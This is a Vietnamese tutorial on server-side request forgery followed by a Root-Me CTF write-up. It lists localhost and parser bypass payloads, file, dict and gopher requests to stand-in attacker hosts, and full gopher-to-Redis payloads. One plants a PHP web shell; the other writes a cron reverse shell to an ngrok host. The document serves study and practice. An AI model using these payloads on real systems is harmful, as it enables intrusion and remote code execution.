# Tìm hiểu về SSRF

## Khái niệm

SSRF (Server Side Request Forgery) là một lỗ hổng bảo mật phổ biến trong các ứng dụng web. SSRF cho phép kẻ tấn công gửi các yêu cầu từ máy chủ web tới các máy chủ khác thông qua một phần mềm trung gian, và như vậy sẽ có thể tấn công được các máy chủ mạng nội bộ, đọc và thậm chí sửa đổi dữ liệu hoặc khai thác các lỗ hổng khác trên hệ thống.

![](https://i.imgur.com/Peqa9Rs.png)

Có ba loại SSRF phổ biến: non-blind, semi-blind và blind SSRF:

**Non-blind SSRF:** Đây là loại SSRF mà kẻ tấn công có thể nhận được các phản hồi từ máy chủ mà họ đang tấn công. Kẻ tấn công có thể sử dụng các phản hồi này để xác định các thông tin về các máy chủ khác, chẳng hạn như địa chỉ IP, cổng và dịch vụ được chạy trên máy chủ đó. Kẻ tấn công có thể sử dụng các thông tin này để tấn công các máy chủ khác hoặc truy cập vào các tài nguyên mà họ không được phép truy cập.

**Semi-blind SSRF:** Đây là loại SSRF mà kẻ tấn công không nhận được các phản hồi từ máy chủ mà họ đang tấn công, tuy nhiên họ có thể xác định kết quả của cuộc tấn công thông qua các phản hồi từ các máy chủ khác. Kẻ tấn công có thể sử dụng các phản hồi này để xác định các thông tin về các máy chủ khác và tiếp tục thực hiện các cuộc tấn công khác.

**Blind SSRF:** Đây là loại SSRF mà kẻ tấn công không nhận được bất kỳ phản hồi nào từ máy chủ mà họ đang tấn công, do đó họ phải dựa vào các phản hồi từ các máy chủ khác để xác định kết quả của cuộc tấn công. Kẻ tấn công có thể sử dụng lỗ hổng này để thực hiện các cuộc tấn công mà không cần phải xác định các thông tin về máy chủ mà họ đang tấn công. Thông thường, kẻ tấn công sử dụng các kỹ thuật như time-based, error-based hoặc out-of-band để xác định kết quả của cuộc tấn công.

## Nguyên nhân

Nguyên nhân chính của lỗ hổng SSRF là do sự thiếu kiểm soát đầu vào của người dùng. Khi ứng dụng web không kiểm tra đầu vào của người dùng đầy đủ và chính xác, kẻ tấn công có thể lợi dụng điểm yếu này để gửi yêu cầu từ máy chủ web đến các máy chủ khác.

Khi ứng dụng web cho phép gửi yêu cầu đến các máy chủ khác thông qua phần mềm trung gian, kẻ tấn công có thể thay đổi các tham số yêu cầu như địa chỉ IP hoặc cổng để tấn công vào các máy chủ mạng nội bộ hoặc các máy chủ khác trong mạng. Kẻ tấn công có thể sử dụng lỗ hổng SSRF để lấy cắp dữ liệu quan trọng, thay đổi nội dung trên các trang web hoặc khai thác các lỗ hổng khác trên hệ thống.

## Một số cách bypass

### URL Format Bypass
```
# Localhost
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22

# CDIR bypass
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

# Dot bypass
127。0。0。1
127%E3%80%820%E3%80%820%E3%80%821

# Decimal bypass
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1

# Octal Bypass
http://0177.0000.0000.0001
http://00000177.00000000.00000000.00000001
http://017700000001

# Hexadecimal bypass
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/ = http://127.0.0.1
http://0xc0a80014/ = http://192.168.0.20


# Domain Parser
https:attacker.com
https:/attacker.com
http:/\/\attacker.com
https:/\attacker.com
//attacker.com
```

### Protocols
```
# file://
file:///etc/passwd

# dict://
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/

# sftp://
ssrf.php?url=sftp://evil.com:11111/

# tftp://
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET

# ldap://
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit

# gopher://
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a

will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```

## Cách ngăn chặn

Để phòng chống SSRF, ta có thể áp dụng các biện pháp sau:

- Kiểm tra và xác thực đầu vào của người dùng trước khi gửi yêu cầu.
- Giới hạn các phương thức yêu cầu đến các máy chủ được tin cậy.
- Sử dụng các phần mềm bảo mật, firewall và hệ thống phát hiện xâm nhập để phát hiện và ngăn chặn các tấn công SSRF.


# Root me/Server Side Request Forgery

![](https://i.imgur.com/VG8gTv3.png)

Link to chall: https://www.root-me.org/en/Challenges/Web-Server/Server-Side-Request-Forgery

## Phân tích

Trang web chưa một form submit url: 

![](https://i.imgur.com/ABXe0i7.png)

Sau khi submit url thì nội dung nhận được sau khi request đến url đó sẽ được in ra màn hình:

![](https://i.imgur.com/kxK6DqU.png)

Vì tên bài là SSRF nên em thử fuzz đơn giản bằng payload: `file:///etc/passwd` và bùmmm

![](https://i.imgur.com/RijUQpC.png)

Nó được thật!

Nhưng flag không nằm ở đây, theo như description thì flag nằm trong folder `/root` để đọc được flag trong folder đó thì ta phải có quyền root.

Em bắt đầu fuzz thêm bằng payload: `http://localhost/` và nhận được:

![](https://i.imgur.com/aFg3r73.png)

Nội dung của chính website này được trả lại.
Vì payload trên là request đến local với port 80 (port mặc định nếu không truyền port) tiếp tục fuzz với những port khác để check xem nếu lợi dụng SSRF thì ta có thể truy cập thêm vào những port nào. Em sử dụng Intruder và set port từ 1 -> 65535 

![](https://i.imgur.com/b3BoTwO.png)

![](https://i.imgur.com/9Nz4Nzl.png)

![](https://i.imgur.com/wbSQ6HE.png)

Vậy là dựa vào SSRF em có thể truy cập vào thêm 2 port khác nữa là 22 (port ssh) và port 6379 (port Redis-Remote Dictionary Server là một hệ thống lưu trữ dữ liệu trong bộ nhớ động mã nguồn mở) để lưu dữ liệu.

Nếu sử dụng port 22 để leo lên root thì em phải biết được key nên hướng tấn công của em sẽ là thông qua port 6379 để up shell.

Biết server sử dụng redis để lưu trữ file, em gửi dụng Gopher protocol để upload Phpshell lên đó bằng cách sử dụng tool: [Gopherus](https://github.com/tarunkant/Gopherus)

> Gopher là một giao thức hoạt động ở tầng Application, nó xung cấp cho ta khả năng trích xuất và xem web document được chứa trên remote Server, gopher là tiền thân của HTTP bây giờ. Ok đã biết gopher là gì rồi thì ta đi tìm hiểu xem tại sao gopher có thể sử dụng để khai thác SSRF.
> 
> Gopher có thể sử dụng để truy cập đến các port của dịch vụ đang mở như mysql, redis, SMTP, PostgreSQL, Zabbix, … để sử dụng các dịch vụ đó để có thể RCE hoặc làm gì đó với cá dịch vụ trên.

## Khai thác

Tạo PHPShell bằng Gopherus:

![](https://i.imgur.com/LE0Lc8S.png)

Upload file đó lên Redis của website:

`gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A`

Sau khi upload xong get PHP Shell với payload:

![](https://i.imgur.com/pzc0IDD.png)

Bắt đầu RCE với params `cmd`:

`ls`:

![](https://i.imgur.com/jcNwuNa.png)

![](https://i.imgur.com/1Y19xJQ.png)

Đã thấy được folder `/root` nhưng ta vẫn chưa phải root để truy cập vào.

Còn về file `passwd` cũng không đọc được :<

![](https://i.imgur.com/rtzygsr.png)

Đi dạo quanh cũng không thu thập được gì :<

Em đi theo hướng còn lại của tool Gopherus là tạo ReverseShell:

1. Ngrok tcp: `ngrok tcp 1234`
    ![](https://i.imgur.com/TQ6DLWe.png)

2. Tạo ReverseShell bằng Gopherus:
    ![](https://i.imgur.com/Lw4ob6l.png)

3. Trước khi upload shell này em cần: 
    - `nc -lvp 1234` Để lắng nghe port 1234.
    - Sửa lại payload vì port sau khi em ngrok là 12500 chứ không phải 1234 như tool Gopherus tạo
    
4. Gửi payload:
    `gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2472%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/0.tcp.ap.ngrok.io/12500%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A`
    
    Và chờ...
    
Sau khi đã reverseshell thành công thì ta chỉ cần `ls` và `cat` file flag thôi:

![](https://i.imgur.com/14gDHnb.png)

Tiếp theo là lấy `passwd` cho Validation Room:

![](https://i.imgur.com/EeuPxnI.png)

## Kết luận
Write up trôi như vậy dĩ nhiên là vì em đã đi tham khảo những bài write up khác, qua bài này em học được rất kiểu kỹ thuật mới cũng như là các tool mới. 

Trân thành cảm ơn tác giả của cách post:
https://nhattruong.blog/2022/04/30/write-up-root-me-server-side-request-forgery/
https://nhienit.wordpress.com/2020/10/20/exploit-ssrf-voi-gopher-protocol/
https://5h4s1.wordpress.com/2022/04/29/task-8/

Và đặc biệt là cảm ơn:

![](https://i.imgur.com/fr2m83N.png)
